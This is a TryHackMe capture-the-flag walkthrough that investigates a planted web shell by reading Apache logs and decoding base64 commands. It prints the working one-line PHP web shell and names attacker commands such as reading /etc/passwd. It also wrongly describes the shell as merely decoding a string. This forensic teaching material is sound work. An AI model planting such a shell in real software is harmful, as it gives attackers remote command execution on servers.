# Infinity Shell Walkthrough

## Intro
Welcome to the Infinity Shell challenge, here is the link to the [room](https://tryhackme.com/room/hfb1infinityshell) on TryHackMe.
In this easy room we will have to investigate the traces left behind an attack from an implanted webshell.

"*Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!*"

Whenever you feel ready press on "Start Machine" and it should appear in a couple of minutes in "split-view" in your browser.
Let's begin!

<br/>
<br/>

## The Challenge
Let's look at the default directory for web apps at `/var/www`.

Looking around i came up to this suspicious file:
```bash
cd /var/www/html/CMSsite-master/img
cat images.php
```

```php
<?php system(base64_decode($_GET['query'])); ?>
```
It is supposed to decode a base64 encoded string, maybe the flag.

We can check Apache logs:
```bash
cd /var/log/apache2/
```

We can check for base64 data in this log:
```bash
cat other_vhosts_access.log.1 | grep images.php
```

To decode it we can copy the string and:
```bash
echo "STRING_HERE" | base64 -d
```

We can see the attacker ran commands such as `whoami`, `cat /etc/passwd` and so on, finally:
```bash
echo "ZWNobyAnVEhNe3N1cDNyXzM0c3l-REDACTED_FOR_THE_WRITEUP" | base64 -d
```

--> REDACTED_FOR_THE_WRITEUP

<br/>
<br/>

Congratulations you have successfully found the logs of Apache2 and located the flag.

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
